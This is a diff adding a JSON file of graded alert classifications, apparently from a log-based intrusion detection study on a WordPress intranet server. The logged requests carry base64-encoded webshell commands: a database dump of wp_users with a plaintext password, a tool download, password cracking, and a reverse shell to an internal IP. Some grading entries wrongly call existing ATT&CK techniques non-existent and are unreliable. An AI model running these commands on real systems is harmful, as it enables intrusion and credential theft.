@@ -1,0 +1,59 @@
+[
+  {
+    "line_number": 86,
+    "predicted_attack_type": [
+      "T1071.001 - Application Layer Protocol: Web Protocols",
+      "T1190 - Exploit Public-Facing Application"
+    ],
+    "attack_type": "webshell",
+    "classification_correct": "Incorrect classification - Technique T1071.001 - Application Layer Protocol: Web Protocols does not exist;Technique T1190 - Exploit Public-Facing Application does not exist;",
+    "classification": "TP",
+    "description": "The alert indicates high entropy in an Apache access request, specifically targeting a PHP file within the WordPress uploads directory. This pattern is often associated with attempts to exploit vulnerabilities or execute malicious code, such as webshells or SQL injection attacks, by disguising malicious payloads within seemingly legitimate requests.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D\"], \"CriticalValue\": 0.041658827497209526, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:38:25 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\\\" 200 507795 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509505], \"DetectionTimestamp\": [1642509505], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 87,
+    "predicted_attack_type": [
+      "T1059.004"
+    ],
+    "attack_type": "webshell",
+    "classification_correct": "Incorrect classification - Incorrect id: T1059.004;",
+    "classification": "TP",
+    "description": "The log entry indicates high entropy in an Apache access request, specifically a GET request to a PHP file containing a base64 encoded string. This pattern is often associated with attempts to execute arbitrary code or download malicious payloads, which aligns with command and script interpreter techniques.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D\"], \"CriticalValue\": 0.04390676928008295, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:38:29 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\\\" 200 506717 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509509], \"DetectionTimestamp\": [1642509509], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 88,
+    "predicted_attack_type": [
+      "T1071.001"
+    ],
+    "attack_type": "passwordcracking",
+    "classification_correct": "Incorrect classification - Incorrect id: T1071.001;",
+    "classification": "TP",
+    "description": "The log entry indicates a high entropy anomaly detected in an Apache access request. The URL contains a base64 encoded string which is often used to obfuscate malicious payloads or commands. This is indicative of potential command and control or data exfiltration attempts.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D\"], \"CriticalValue\": 0.03390702800176404, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:39:11 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1\\\" 200 506876 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509551], \"DetectionTimestamp\": [1642509551], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 90,
+    "predicted_attack_type": [
+      "T1059.004"
+    ],
+    "attack_type": "passwordcracking",
+    "classification_correct": "Incorrect classification - Incorrect id: T1059.004;",
+    "classification": "TP",
+    "description": "The CPU usage has significantly deviated from the average, indicating a potential spike in system activity that could be indicative of malicious processes or resource exhaustion.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 36, \"AnalysisComponentType\": \"MatchValueAverageChangeDetector\", \"AnalysisComponentName\": \"AMiner: CPU value deviates from average in monitoring logs.\", \"Message\": \"Statistical data report\", \"PersistenceFileName\": \"Default\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model\", \"/model/version\", \"/model/agent/version\", \"/model/metricset/version\", \"/model/event/version\", \"/model/time\", \"/model/service/version\", \"/model/version/0\", \"/model/version/1\", \"/model/agent/version/0\", \"/model/agent/version/1\", \"/model/agent/version/2\", \"/model/agent/version/3\", \"/model/agent/version/4\", \"/model/system/cpu/softirq/version\", \"/model/system/cpu/softirq/norm/version\", \"/model/system/cpu/iowait/version\", \"/model/system/cpu/iowait/norm/version\", \"/model/system/cpu/nice/val\", \"/model/system/cpu/nice/norm/val\", \"/model/system/cpu/val\", \"/model/system/cpu/idle/version\", \"/model/system/cpu/idle/norm/version\", \"/model/system/cpu/system/val\", \"/model/system/cpu/system/norm/val\", \"/model/system/cpu/steal/version\", \"/model/system/cpu/steal/norm/version\", \"/model/system/cpu/total/val\", \"/model/system/cpu/total/norm/val\", \"/model/system/cpu/user/version\", \"/model/system/cpu/user/norm/version\", \"/model/system/cpu/irq/version\", \"/model/system/cpu/irq/norm/version\", \"/model/metricset/version/0\", \"/model/metricset/version/1\", \"/model/event/version/0\", \"/model/event/version/1\", \"/model/event/version/2\", \"/model/ecs/version\", \"/model/host/cpu/version\", \"/model/host/version\"], \"AnomalyScores\": [{\"Path\": \"/model/system/cpu/total/norm/val\", \"AnalysisData\": {\"New\": {\"N\": 100, \"Avg\": 0.4090230000000001, \"Var\": 0.144338616132323}, \"Old\": {\"N\": 3800, \"Avg\": 0.07845189473684211, \"Var\": 0.0037339315099652274}}}], \"MinBinElements\": 100, \"MinBinTime\": 10, \"DebugMode\": false}, \"LogData\": {\"RawLogData\": [\"{\\\"@timestamp\\\":\\\"2022-01-18T12:59:54.321Z\\\",\\\"service\\\":{\\\"type\\\":\\\"system\\\"},\\\"tags\\\":[\\\"beats_input_raw_event\\\"],\\\"@version\\\":\\\"1\\\",\\\"agent\\\":{\\\"type\\\":\\\"metricbeat\\\",\\\"hostname\\\":\\\"intranet-server\\\",\\\"version\\\":\\\"7.13.2\\\",\\\"id\\\":\\\"a0c41e4e-ff4a-481f-adda-21fc96889b28\\\",\\\"name\\\":\\\"intranet-server\\\",\\\"ephemeral_id\\\":\\\"ae20c47b-0a81-4e05-a749-cbe0dacd5e36\\\"},\\\"system\\\":{\\\"cpu\\\":{\\\"softirq\\\":{\\\"pct\\\":4.0E-4,\\\"norm\\\":{\\\"pct\\\":4.0E-4}},\\\"iowait\\\":{\\\"pct\\\":0,\\\"norm\\\":{\\\"pct\\\":0}},\\\"nice\\\":{\\\"pct\\\":0.9362,\\\"norm\\\":{\\\"pct\\\":0.9362}},\\\"cores\\\":1,\\\"idle\\\":{\\\"pct\\\":0,\\\"norm\\\":{\\\"pct\\\":0}},\\\"system\\\":{\\\"pct\\\":0.0362,\\\"norm\\\":{\\\"pct\\\":0.0362}},\\\"steal\\\":{\\\"pct\\\":9.0E-4,\\\"norm\\\":{\\\"pct\\\":9.0E-4}},\\\"total\\\":{\\\"pct\\\":1,\\\"norm\\\":{\\\"pct\\\":1}},\\\"user\\\":{\\\"pct\\\":0.0262,\\\"norm\\\":{\\\"pct\\\":0.0262}},\\\"irq\\\":{\\\"pct\\\":0,\\\"norm\\\":{\\\"pct\\\":0}}}},\\\"metricset\\\":{\\\"name\\\":\\\"cpu\\\",\\\"period\\\":45000},\\\"event\\\":{\\\"duration\\\":365552,\\\"dataset\\\":\\\"system.cpu\\\",\\\"module\\\":\\\"system\\\"},\\\"ecs\\\":{\\\"version\\\":\\\"1.9.0\\\"},\\\"host\\\":{\\\"cpu\\\":{\\\"pct\\\":1},\\\"name\\\":\\\"intranet-server\\\"}}\"], \"Timestamps\": [1642510794.32], \"DetectionTimestamp\": [1642510794.32], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/logstash/intranet-server/system.cpu.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.204\"}}\n"
+  },
+  {
+    "line_number": 93,
+    "predicted_attack_type": [
+      "T1059.004",
+      "T1071.001"
+    ],
+    "attack_type": "reverseshell",
+    "classification_correct": "Partially correct classification - Incorrect id: T1071.001;",
+    "classification": "TP",
+    "description": "The log entry shows high entropy in a GET request to a PHP file, which is indicative of potential command injection or obfuscated malicious code execution. The presence of base64 encoded data within the URL parameters further supports this classification.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D\"], \"CriticalValue\": 0.03829718556363683, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:13:14:18 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\\\" 200 506717 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642511658], \"DetectionTimestamp\": [1642511658], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  }
+]
